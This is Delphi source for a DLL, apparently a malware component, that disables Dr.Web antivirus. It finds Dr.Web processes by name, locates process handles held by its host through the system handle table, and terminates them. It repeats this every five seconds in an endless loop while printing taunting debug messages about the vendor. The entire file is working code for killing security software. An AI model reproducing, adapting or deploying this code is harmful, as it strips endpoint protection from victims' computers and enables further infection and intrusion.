{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program dwunprot;
{$ENDIF}
unit dwunprot;
interface

uses
  Windows, WinNative, RTL;


implementation

const
  DrWebProcessesMax = 6;
  String1: PWideChar = 'Terminating by handle 0x';
  String2: PWideChar = 'Whoups I did it again }:)';
  String4: PWideChar = 'Bonjourno!';
  String5: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String6: PWideChar = 'dwunprot.dll';
  FunnyStuff: array[0..4] of PWideChar = ('By buying Dr.Web you are supporting Communism }:)', 'Vodka - Daniloff!',
    'Perestroyka - Komarov!', 'Communism - Gladkih!', '');
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'drweb32w.exe', 'dwengine.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe', 'spidergate.exe', 'spideragent.exe');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  DrWebID: array[0..DrWebProcessesMax] of DWORD;
  ProcessHandles: array[0..39] of THANDLE;
  ProcessHandlesCount: integer = 0;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;

procedure FillProcessesArray();
var
  h2: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  ProcessHandlesCount := 0;
  memzero(@DrWebID, sizeof(DrWebID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        if (last = DrWebProcessesMax) then break;
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pBuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            DrWebID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to buf^.uHandleCount - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
      begin
        if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then //Process Type Object ID
        begin

          h2 := buf^.rHandleTable[c].Handle;
          if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin
            for i := 0 to DrWebProcessesMax do
            begin
              if (pbi.UniqueProcessId = DrWebID[i]) then
              begin
                ProcessHandles[ProcessHandlesCount] := h2;
                inc(ProcessHandlesCount);
              end;
            end;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
end;

var
  buf1: LBuf;
  EventHandle: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;

procedure KillProcesses();
var
  i: integer;
begin
  for i := 0 to ProcessHandlesCount - 1 do
  begin
    strcpyW(@buf1[0], String1);
    uitohexW(ProcessHandles[i], strendW(buf1));
    OutputDebugStringW(buf1);

    if (ZwTerminateProcess(ProcessHandles[i], 0) = STATUS_SUCCESS) then
      OutputDebugStringW(String2);
    ZwClose(ProcessHandles[i]);
  end;
end;

procedure RandomizeEx();
var
  p1: NTSYSTEMTIME;
  p2: LARGE_INTEGER;
begin
  ZwQuerySystemTime(@p2);
  RtlTimeToTimeFields(@p2, @p1);
  RandSeed := (((((p1.Hour * 60) + p1.Minute) * 60) + p1.Second) * 100) + p1.Milliseconds;
end;

procedure main();
var
  s: integer;
begin
  OutputDebugStringW(String4);
  EventHandle := 0;
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    FillProcessesArray();
    KillProcesses();
    ZwSetEvent(EventHandle, nil);
    ZwClose(EventHandle);
    RandomizeEx();

    while (true) do
    begin
      NtSleep(5000);
      FillProcessesArray();
      KillProcesses();
      s := random(4);
      OutputdebugStringW(FunnyStuff[s]);
    end;

  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

